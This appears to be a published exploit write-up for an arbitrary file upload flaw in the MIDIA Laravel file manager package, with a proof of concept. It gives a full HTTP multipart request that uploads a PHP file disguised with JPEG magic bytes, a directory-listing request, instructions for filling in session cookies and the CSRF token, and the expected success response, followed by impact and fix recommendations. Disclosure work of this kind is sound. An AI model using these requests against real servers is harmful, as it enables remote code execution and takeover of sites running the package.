# 🚨 MIDIA - Unrestricted File Upload / Arbitrary File Upload

**Exploit Title:** MIDIA Unrestricted File Upload / Arbitrary File Upload  
**Date:** 02 October 2024  
**Exploit Author:** Khunerable  
**Tested On:** Windows 11, Windows NT 10.0  
**Vendor Homepage:** [https://github.com/itskodinger/midia](https://github.com/itskodinger/midia/tree/master)
**Link Description:** [https://cxsecurity.com/issue/WLB-2024100003](https://cxsecurity.com/issue/WLB-2024100003)
---

## 📄 Description

MIDIA is a file manager package for Laravel. A vulnerability exists that allows unauthenticated (or improperly authenticated) users to upload arbitrary files including PHP scripts to any available directory, resulting in remote code execution (RCE).

---

## 🧪 Proof of Concept (PoC)

### 📁 List Uploaded Files

To see the uploaded files and directory listings:

```
GET /midia/get/1?key=&directory_name=blog
```

Example:

```
https://example.com/midia/get/1?key=&directory_name=blog
```

---

### 📤 Upload Malicious File

**Request:**

```
POST /midia/upload?directory_name=blog HTTP/2
Host: example.com
Cookie: [Your Session Cookies]
X-Csrf-Token: [CSRF Token from target]
Content-Type: multipart/form-data; boundary=---------------------------boundary

-----------------------------boundary
Content-Disposition: form-data; name="file"; filename="dummy.php"
Content-Type: image/jpeg

ÿØÿà<?php phpinfo(); ?>
-----------------------------boundary--
```

You must replace:

- `directory_name=blog` with any available directory
- `X-Csrf-Token` with valid token
- Cookies with valid `XSRF-TOKEN` and session values

---

### ✅ Server Response

Successful upload will return a JSON response:

```json
{
  "success": "dummy.php"
}
```

Your file can be accessed at:

```
https://example.com/midia/get/1?key=&directory_name=blog
```

---

## ⚠️ Impact

This vulnerability allows an attacker to:

- Upload and execute arbitrary PHP code
- Gain remote access to the server
- Compromise entire Laravel applications using this package

---

## 🛡️ Recommendation

- Update or patch the MIDIA package to restrict file types and enforce authentication
- Implement server-side MIME validation
- Prevent `.php`, `.phar`, or similar executable uploads

---

> 📌 Disclaimer: This repository is for educational purposes only. Use responsibly.
